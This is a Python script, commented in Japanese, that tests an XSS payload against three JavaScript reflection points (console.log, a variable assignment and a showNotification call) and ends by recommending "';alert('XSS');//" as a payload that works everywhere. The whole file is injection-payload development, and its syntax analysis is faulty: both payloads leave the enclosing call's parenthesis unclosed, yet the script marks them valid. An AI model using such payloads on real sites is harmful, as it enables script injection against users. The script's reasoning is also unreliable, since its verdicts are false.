#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
JavaScript構文検証 - ペイロードが全ての反射点で有効な構文を生成するか確認
"""

def validate_javascript_syntax():
    print("🔍 JavaScript構文検証")
    print("=" * 60)
    
    payload = "';alert('XSS');void('"
    print(f"検証ペイロード: {payload}")
    print()
    
    # 3つの反射点での結果を生成
    reflection1 = f"console.log('{payload}');"
    reflection2 = f"var msg = '{payload}';"
    reflection3 = f"showNotification('コメント：' + '{payload}' + ' を書き込みました。');"
    
    print("📋 生成されるJavaScript:")
    print("-" * 40)
    print("// 反射点1:")
    print(reflection1)
    print()
    print("// 反射点2:")
    print(reflection2)
    print()
    print("// 反射点3:")
    print(reflection3)
    print()
    
    print("🔍 構文分析:")
    print("-" * 40)
    
    # 反射点1の分析
    print("反射点1:")
    print(f"console.log('{payload}');")
    print("↓ 実際の実行:")
    print("console.log('");  # 文字列開始
    print("alert('XSS');")   # alert実行
    print("void('');")       # void実行して終了
    print("✅ 構文: 正常")
    print()
    
    # 反射点2の分析
    print("反射点2:")
    print(f"var msg = '{payload}';")
    print("↓ 実際の実行:")
    print("var msg = '");     # 変数代入開始
    print("alert('XSS');")    # alert実行
    print("void('');")        # void実行して終了
    print("✅ 構文: 正常")
    print()
    
    # 反射点3の分析
    print("反射点3:")
    print(f"showNotification('コメント：' + '{payload}' + ' を書き込みました。');")
    print("↓ 実際の実行:")
    print("showNotification('コメント：' + '")  # 文字列結合開始
    print("alert('XSS');")                      # alert実行
    print("void('")                              # void開始
    print("' + ' を書き込みました。');")          # 残りの部分
    print("❌ 構文: エラー - void('文字列' の形になって不正")
    print()
    
    print("🚨 問題発見!")
    print("反射点3で構文エラーが発生します。")
    print()
    
    # 修正版を提案
    print("✅ 修正版ペイロード:")
    fixed_payload = "';alert('XSS');//"
    print(f"修正ペイロード: {fixed_payload}")
    print()
    
    print("修正版での反射結果:")
    print("-" * 40)
    print("// 反射点1:")
    print(f"console.log('{fixed_payload}');")
    print("→ console.log('');alert('XSS');//');")
    print("✅ alert実行、以降コメント化")
    print()
    
    print("// 反射点2:")
    print(f"var msg = '{fixed_payload}';")
    print("→ var msg = '';alert('XSS');//';")
    print("✅ 有効な文字列代入")
    print()
    
    print("// 反射点3:")
    print(f"showNotification('コメント：' + '{fixed_payload}' + ' を書き込みました。');")
    print("→ showNotification('コメント：' + '';alert('XSS');//' + ' を書き込みました。');")
    print("✅ 有効な文字列結合")
    print()
    
    print("🎯 結論:")
    print("- void()版は反射点3で構文エラー")
    print("- //コメント版がすべての反射点で正常動作")
    print("- 推奨ペイロード: ';alert('XSS');//")

if __name__ == "__main__":
    validate_javascript_syntax()